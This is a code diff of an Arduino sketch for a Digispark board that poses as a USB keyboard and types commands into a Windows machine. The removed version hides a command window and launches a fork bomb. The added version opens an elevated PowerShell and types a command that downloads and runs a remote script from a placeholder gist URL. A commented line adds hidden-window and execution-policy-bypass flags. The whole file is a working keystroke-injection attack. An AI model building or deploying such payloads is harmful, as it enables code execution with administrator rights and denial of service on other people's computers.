@@ -1,29 +1,25 @@
 #include "DigiKeyboardPtBr.h"
 void setup() {
   pinMode(0,OUTPUT); 
-  pinMode(1,OUTPUT);   
+  pinMode(1,OUTPUT);     
 }
 
 void loop() {  
   pisca_led(100);
   DigiKeyboardPtBr.sendKeyStroke(0);
-  DigiKeyboardPtBr.delay(500);
-  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboardPtBr.delay(500);
-  DigiKeyboardPtBr.print("cmd");
-  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardPtBr.delay(500);
-  //Obfuscate the terminal
-  DigiKeyboardPtBr.print("MODE CON: COLS=15 LINES=1");
-  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(100);
-  DigiKeyboardPtBr.print("COLOR EF");
-  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
-  //Run the fork bomb
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(100);
+  DigiKeyboardPtBr.println("powershell Start-Process powershell -Verb runAs"); 
   DigiKeyboardPtBr.delay(500);
-  DigiKeyboardPtBr.print(F("for /l %x in (0,0,0) do start"));
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(3000); 
+  // Faz o dwnload e executa o script publicado no gist
+  DigiKeyboardPtBr.print(F("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/ScriptOlaMundo.ps1');\""));
+  // Caso queira esconder o resultado do script.
+  //DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/ScriptOlaMundo.ps1');\""));
+  DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
-
   pisca_led(1000); 
   for(;;){ /*empty*/ }  
 }
